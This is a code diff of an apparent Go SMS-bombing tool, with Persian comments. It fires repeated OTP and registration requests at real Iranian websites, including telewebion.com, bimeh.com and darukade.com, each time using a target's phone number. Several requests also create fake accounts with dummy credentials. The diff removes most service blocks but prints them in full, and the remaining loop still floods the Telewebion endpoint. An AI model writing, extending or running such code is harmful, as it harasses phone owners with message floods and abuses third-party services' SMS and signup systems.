@@ -668,11 +668,11 @@ cookieJar, _ := cookiejar.New(nil)
         Timeout: 10 * time.Second,
 	}
 
-	tasks := make(chan func(), repeatCount*130)
+	tasks := make(chan func(), repeatCount*100)
 
 	var wg sync.WaitGroup
 
-	ch := make(chan int, repeatCount*130)
+	ch := make(chan int, repeatCount*100)
 
 	for i := 0; i < numWorkers; i++ {
 		go func() {
@@ -684,154 +684,16 @@ cookieJar, _ := cookiejar.New(nil)
 
 	for i := 0; i < repeatCount; i++ {
 
-	// --- اضافه کردن سرویس Telewebion ---
-		wg.Add(1) // برای هر درخواست جدید باید Add(1) رو صدا بزنید
+        	//Telewebion
+		wg.Add(1) 
 		tasks <- func(c *http.Client) func() {
 			return func() {
-				// ساختار JSON مورد نیاز سرویس Telewebion
 				payload := map[string]interface{}{
 					"code":      "98",
-					"phone":     getPhoneNumberNoZero(phone), // شماره بدون صفر اول
+					"phone":     getPhoneNumberNoZero(phone),
 					"smsStatus": "default",
 				}
 				sendJSONRequest(c, ctx, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", payload, &wg, ch)
-			}
-		}(client)
-
-		// --- سرویس 3: kimiaonline.com ---
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("mobile", phone) // شماره تلفن با صفر اول
-				formData.Set("ReturnUrl", "")
-				formData.Set("__RequestVerificationToken", "PLACEHOLDER_DYNAMIC_TOKEN") // این مقدار احتمالاً داینامیک است و ممکن است نیاز به دریافت خودکار داشته باشد
-				formData.Set("step", "1")
-
-				sendFormRequest(c, ctx, "https://kimiaonline.com/Customer/ApiLoginFull", formData, &wg, ch)
-			}
-		}(client)
-
-		// --- سرویس 4: armaghan90.ir ---
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("username", phone) // شماره تلفن با صفر اول
-				formData.Set("csrfmiddlewaretoken", "PLACEHOLDER_DYNAMIC_TOKEN") // این مقدار احتمالاً داینامیک است
-
-				sendFormRequest(c, ctx, "https://armaghan90.ir/users/login-register/", formData, &wg, ch)
-			}
-		}(client)
-
-		// --- سرویس 5: numberland.ir ---
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("vaziatload", "checkfornewentertosite")
-				formData.Set("enterbyusepass", "1")
-				formData.Set("XCSRFTOKEN", "PLACEHOLDER_DYNAMIC_TOKEN") // این مقدار احتمالاً داینامیک است
-				formData.Set("user", phone) // شماره تلفن با صفر اول
-				formData.Set("safeme", "1")
-				formData.Set("captcha", "")
-				formData.Set("captcha_ses", "")
-				formData.Set("json", "1")
-				formData.Set("whatsapp", "0")
-
-				sendFormRequest(c, ctx, "https://numberland.ir/ajax_login.php", formData, &wg, ch)
-			}
-		}(client)
-
-		// --- سرویس 6: bimeh.com ---
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"MobileNumber": phone, // شماره تلفن با صفر اول
-				}
-				sendJSONRequest(c, ctx, "https://coreapi.bimeh.com/v1/authentication", payload, &wg, ch)
-			}
-		}(client)
-
-		// --- سرویس 8: zanoone.ir ---
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"Mobile": phone, // شماره تلفن با صفر اول
-					"FirstName": "testname", // مقدار ثابت یا تصادفی
-					"LastName": "testlastname", // مقدار ثابت یا تصادفی
-					"Gender": "false", // مقدار ثابت
-					"Email": "test@gmail.com", // مقدار ثابت یا تصادفی
-				}
-				sendJSONRequest(c, ctx, "https://zanoone.ir/api/auth/register", payload, &wg, ch)
-			}
-		}(client)
-
-		// --- سرویس 10: darukade.com ---
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"Mobile": phone, // شماره تلفن با صفر اول
-					"FirstName": "تست نام", // مقدار ثابت یا تصادفی
-					"LastName": "تست نام خانوادگی", // مقدار ثابت یا تصادفی
-					"Gender": "true", // مقدار ثابت
-					"Email": "test@gmail.com", // مقدار ثابت یا تصادفی
-				}
-				sendJSONRequest(c, ctx, "https://darukade.com/api/auth/register", payload, &wg, ch)
-			}
-		}(client)
-
-		// --- سرویس 11: irankohan.ir ---
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("returnUrl", "")
-				formData.Set("CompanyName", "")
-				formData.Set("Name", "testname") // مقدار ثابت یا تصادفی
-				formData.Set("Mobile", phone) // شماره تلفن با صفر اول
-				formData.Set("Email", "test@gmail.com") // مقدار ثابت یا تصادفی
-				formData.Set("Password", "testpassword123") // مقدار ثابت یا تصادفی
-				formData.Set("ConfirmPassword", "testpassword123") // مقدار ثابت یا تصادفی
-				formData.Set("X-Requested-With", "XMLHttpRequest") // در فرم دیتا قرار داده شده
-
-				sendFormRequest(c, ctx, "https://irankohan.ir/Register/Register", formData, &wg, ch)
-			}
-		}(client)
-
-		// --- سرویس 13: taminniaz.com ---
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("action", "digits_check_mob")
-				formData.Set("countrycode", "+98")
-				formData.Set("mobileNo", phone) // شماره تلفن با صفر اول
-				formData.Set("csrf", "PLACEHOLDER_DYNAMIC_TOKEN") // این مقدار احتمالاً داینامیک است
-				formData.Set("login", "2")
-				formData.Set("username", "") // ممکن است نیاز به شماره تلفن داشته باشد یا ثابت باشد
-				formData.Set("email", "test@gmail.com") // مقدار ثابت یا تصادفی
-				formData.Set("captcha", "")
-				formData.Set("captcha_ses", "")
-				formData.Set("json", "1")
-				formData.Set("whatsapp", "0")
-
-				sendFormRequest(c, ctx, "https://taminniaz.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-			}
-		}(client)
-
-		// --- سرویس 14: mo7.ir ---
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("action", "bakala_send_code")
-				formData.Set("phone_email", phone) // شماره تلفن با صفر اول
-
-				sendFormRequest(c, ctx, "https://mo7.ir/bakala/ajax/send_code/", formData, &wg, ch)
 			}
 		}(client)
 
